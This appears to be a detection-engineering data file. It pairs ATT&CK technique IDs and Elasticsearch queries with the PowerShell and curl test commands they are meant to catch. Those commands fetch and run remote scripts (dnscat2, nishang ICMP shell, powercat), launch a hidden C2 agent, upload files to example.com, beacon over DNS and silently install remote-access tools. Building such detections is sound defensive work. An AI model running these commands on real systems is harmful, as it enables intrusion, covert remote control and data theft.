T1105,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""New-Object System.Net.WebClient""}},
                        {""wildcard"":{""CommandLine"": ""*.Headers.add""}},
                        {""wildcard"":{""CommandLine"": ""*.DownloadData""}},
                        {""match_phrase"":{""CommandLine"": ""sandcat.go""}},
                        {""wildcard"":{""CommandLine"": ""*.ResponseHeaders""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""get-process""}},
                        {""match_phrase"": {""CommandLine"": ""stop-process""}},
                        {""match_phrase"": {""CommandLine"": ""Start-Process""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$server=""#{app.contact.http}"";
$url=""$server/file/download"";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add(""platform"",""windows"");
$wc.Headers.add(""file"",""sandcat.go"");
$data=$wc.DownloadData($url);
$name=$wc.ResponseHeaders[""Content-Disposition""].Substring($wc.ResponseHeaders[""Content-Disposition""].IndexOf(""filename="")+9).Replace(""`"""","""");
get-process | ? {$_.modules.filename -like ""C:\Users\Public\$name.exe""} | stop-process -f;
rm -force ""C:\Users\Public\$name.exe"" -ea ignore;
[io.file]::WriteAllBytes(""C:\Users\Public\$name.exe"",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList ""-server $server -group red"" -WindowStyle hidden;",2（4）
T1219,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""match_phrase"":{""CommandLine"": ""Start-Process""}},
                            {""match_phrase"":{""CommandLine"": ""ammyy.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Start-Process $env:temp\ammyy.exe,2（4）
T1219,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""match_phrase"":{""CommandLine"": ""AnyDesk.exe""}},
                            {""match_phrase"":{""CommandLine"": ""Start-Process""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe; 
$file1 = ""C:\Users\"" + $env:username + ""\Desktop\AnyDesk.exe""; 
Start-Process $file1 /S;",2（4）
T1105,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""Curl*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": "" -T ""}},
                        {""match"": {""CommandLine"": ""--upload""}},
                        {""match"": {""CommandLine"": "" -d ""}},
                        {""match"": {""CommandLine"": ""--data ""}},
                        {""match"": {""CommandLine"": "" -k ""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com 
&& C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com 
&& C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com 
&& C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com

C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll && C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll && C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll && C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll",2（4）
T1071.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""match_phrase"":{""CommandLine"": ""Start-Dnscat2""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'); 
Start-Dnscat2 -Domain",2（4）
T1071.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""for(""}},
                        {""match_phrase"": {""CommandLine"": ""Resolve-DnsName""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Get-Random""}},
                        {""term"": {""CommandLine"": ""127.0.0.1""}},
                        {""term"": {""CommandLine"": ""xip.io""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type ""TXT"" ""atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io"" -QuickTimeout}",2（4）
T1071.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""match_phrase"":{""CommandLine"": ""Set-Location""}},
                            {""match_phrase"":{""CommandLine"": ""dns-domain-length.ps1""}},
                            {""term"":{""CommandLine"": ""127.0.0.1""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Set-Location PathToAtomicsFolder; .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.xip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT,2（4）
T1071.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Set-Location""}},
                        {""match_phrase"": {""CommandLine"": ""dns-beacon.ps1""}},
                        {""term"": {""CommandLine"": ""127.0.0.1""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""-C2Interval""}},
                        {""match_phrase"": {""CommandLine"": ""-C2Jitter""}},
                        {""match_phrase"": {""CommandLine"": ""-RunTime""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Set-Location PathToAtomicsFolder; .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30,2（4）
T1572,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                            {""match_phrase"":{""CommandLine"": ""Set-Location""}},
                            {""match_phrase"":{""CommandLine"": ""doh-domain-length.ps1""}},
                            {""match_phrase"":{""CommandLine"": ""-DohServer""}}
            ],
            ""minimum_should_match"": 2
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Set-Location PathToAtomicsFolder; .\T1572\src\T1572-doh-domain-length.ps1 -DohServer,2（4）
T1572,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                            {""match_phrase"":{""CommandLine"": ""Set-Location""}},
                            {""match_phrase"":{""CommandLine"": ""doh-beacon.ps1""}},
                            {""match_phrase"":{""CommandLine"": ""-DohServer""}}
            ],
            ""minimum_should_match"": 2
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Set-Location PathToAtomicsFolder; .\T1572\src\T1572-doh-beacon.ps1 -DohServer,2（4）
T1105,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                            {""match_phrase"":{""CommandLine"": ""MpCmdRun.exe -DownloadFile""}},
                            {""match_phrase"":{""CommandLine"": ""IMEWDBLD.exe""}},
                            {""match_phrase"":{""CommandLine"": ""certutil -urlcache""}},
                            {""match_phrase"":{""CommandLine"": ""certutil -verifyctl""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","cd ""%ProgramData%\Microsoft\Windows Defender\platform\4.18*"" && MpCmdRun.exe -DownloadFile -url 
https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\Atomic-license.txt



$imewdbled = $env:SystemRoot + ""\System32\IME\SHARED\IMEWDBLD.exe""; & $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml",
T1219,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""match_phrase"":{""CommandLine"": ""GoToAssist.exe""}},
                            {""match_phrase"":{""CommandLine"": ""Start-Process""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe ""https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1""; 
$file1 = ""C:\Users\"" + $env:username + ""\Downloads\GoToAssist.exe""; Start-Process $file1 /S;",2（4）
T1095,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                            {""match_phrase"":{""CommandLine"": ""Invoke-PowerShellIcmp""}},
                            {""term"":{""CommandLine"": ""nc -l -p""}},
                            {""match_phrase"":{""CommandLine"": ""powercat -c""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1'); 
Invoke-PowerShellIcmp -IPAddress

IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1'); 
powercat -c",2（4）
T1105,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                              
                            {""match_phrase"":{""CommandLine"": ""System.IO.Compression.FileSystem""}},
                            {""match_phrase"":{""CommandLine"": ""PSTools.zip""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
$web = (New-Object System.Net.WebClient);
$result = $web.DownloadFile(""https://download.sysinternals.com/files/PSTools.zip"", ""PSTools.zip"");
New-Item -ItemType ""directory"" C:\Windows\System32\PSTools -Force;
Add-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(""PSTools.zip"", ""C:\Windows\System32\PSTools"");",2（4）
